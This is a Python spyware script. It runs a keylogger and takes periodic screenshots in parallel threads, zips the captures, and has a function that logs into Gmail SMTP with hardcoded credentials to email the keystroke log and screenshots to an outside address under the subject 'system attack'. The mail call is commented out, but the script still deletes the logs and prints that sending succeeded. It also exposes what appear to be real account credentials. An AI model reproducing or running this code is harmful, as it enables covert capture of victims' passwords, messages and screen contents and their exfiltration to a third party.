import threading
import time
from datetime import datetime
import os
import pyautogui  # for screen capture
from pynput import keyboard  # for keylogger
import shutil
# Path to save screenshots
screenshots_folder = "D:\Screenshots\\"
keystrokes_file = "D:\log.txt"
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
def capture_screen():
    os.makedirs(screenshots_folder, exist_ok=True)
    while True:
        # Get current timestamp for unique filename
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{timestamp}.png"
        # Take screenshot
        screenshot = pyautogui.screenshot()
        # Save screenshot
        screenshot.save(screenshots_folder+filename)
        print(f"Saved screenshot: {filename}")
        # wait for 5 seconds
        time.sleep(5) # can change to take screenshot each 3 minutes

def on_press(key):
    try:
        # Get the current time in seconds since the epoch (January 1, 1970)
        curr_time_since_epoch = time.time()
        # Convert the current time in seconds since the epoch to a human-readable string
        curr_time = time.ctime(curr_time_since_epoch)

        with open(keystrokes_file, "a") as f:
            f.write(str(curr_time) + " : " + f"{key}" + "\n")
            f.flush()
    except AttributeError:
        # special keys
        with open(keystrokes_file, "a") as f:
            f.write(f"[{key.name}]")
    return True

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
def connectGmail():
    src_email="hackerdentutuonglai20@gmail.com"
    des_email='mn.nguyen020@gmail.com'
    s=smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(src_email, 'wjtx psia psxu nsqf')
    mess=MIMEMultipart()
    mess['From']=src_email
    mess['To']=des_email
    mess['Subject']='Tan cong he thong'
    with open('D:\log.txt', "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    # Encode file in ASCII characters to send by email
    encoders.encode_base64(part)

    # Add header as key/value pair to attachment part
    part.add_header("Content-Disposition", f"attachment; filename= log.txt")

    # Add attachment to message
    mess.attach(part)
    with open('D:\Screenshots.zip', "rb") as attachment:
        part2 = MIMEBase("application", "octet-stream")
        part2.set_payload(attachment.read())

    # Encode file in ASCII characters to send by email
    encoders.encode_base64(part2)

    # Add header as key/value pair to attachment part
    part2.add_header("Content-Disposition", f"attachment; filename= screenshot.zip")

    # Add attachment to message
    mess.attach(part2)
    s.sendmail(src_email, des_email, mess.as_string())
    s.quit()
def zip_screenshots_folder():
    time.sleep(12)
    while True:
        print("zipping...")
        shutil.make_archive(screenshots_folder, 'zip', "D:\Screenshots")
        print("done")
        try:
            shutil.rmtree(screenshots_folder)
            print(f"Folder '{screenshots_folder}' removed successfully.")
            os.makedirs(screenshots_folder, exist_ok=True)
        except OSError as e:
            print(f"Error: {e}")
        print("sending mail...")
        # connectGmail()
        os.remove(keystrokes_file)
        os.remove("D:\Screenshots.zip")
        print("sending mail successful")

        time.sleep(20)# in seconds, can change to zip and send mail 1 time per day

# Run both in separate threads
thread_screen = threading.Thread(target=capture_screen)
thread_keylogger = threading.Thread(target=start_keylogger)
thread_zipfolder = threading.Thread(target=zip_screenshots_folder)

thread_screen.start()
thread_keylogger.start()
thread_zipfolder.start()
# Keep main thread alive
thread_screen.join()
thread_keylogger.join()
thread_zipfolder.join()